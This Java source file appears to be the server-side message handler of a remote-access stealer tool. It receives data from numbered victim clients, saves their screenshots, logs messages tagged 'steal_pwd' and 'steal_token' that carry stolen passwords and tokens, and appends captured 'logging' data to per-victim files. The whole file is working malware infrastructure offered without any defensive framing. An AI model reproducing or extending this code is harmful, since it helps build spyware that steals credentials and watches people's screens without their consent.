package me.soda.server.handlers;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.Base64;

import static me.soda.server.Server.log;

public class MessageHandler {
    private static String decodeBase64(String str) {
        byte[] result = Base64.getDecoder().decode(str.getBytes());
        return new String(result);
    }

    private static String[] doStringParse(String[] msgArr) throws IllegalArgumentException {
        if (msgArr.length < 2) throw new IllegalArgumentException();
        String[] msgArr_ = decodeBase64(msgArr[1]).split(" ");
        String[] strArr = new String[msgArr_.length - 1];
        for (int index = 0; index < strArr.length; index++) {
            strArr[index] = decodeBase64(msgArr_[index + 1]);
        }
        return strArr;
    }

    @SuppressWarnings("ResultOfMethodCallIgnored")
    public static void handle(String[] msgArr, int cIndex) {
        try {
            switch (msgArr[0]) {
                case "screenshot" -> {
                    File screenshotFile = new File("screenshots", getFileName("png", cIndex, true));
                    new File("screenshots").mkdir();
                    screenshotFile.createNewFile();
                    FileOutputStream file = new FileOutputStream(screenshotFile);
                    file.write(Base64.getDecoder().decode(msgArr[1]));
                    file.close();
                }
                case "steal_pwd", "steal_token" ->
                        log("Message: " + msgArr[0] + " " + Arrays.toString(doStringParse(msgArr)));
                case "logging" -> {
                    File logFile = new File("logging", getFileName("log", cIndex, false));
                    new File("logging").mkdir();
                    logFile.createNewFile();
                    FileInputStream file2In = new FileInputStream(logFile);
                    String oldInfo = new String(file2In.readAllBytes(), StandardCharsets.UTF_8);
                    file2In.close();
                    FileOutputStream file2Out = new FileOutputStream(logFile);
                    file2Out.write((oldInfo + decodeBase64(msgArr[1])).getBytes(StandardCharsets.UTF_8));
                    file2Out.close();
                }
                default -> log("Message: " + msgArr[0] + " " + decodeBase64(msgArr[1]));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String getFileName(String suffix, int cIndex, boolean time) {
        return "id" + cIndex + (time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "") + "." + suffix;
    }
}
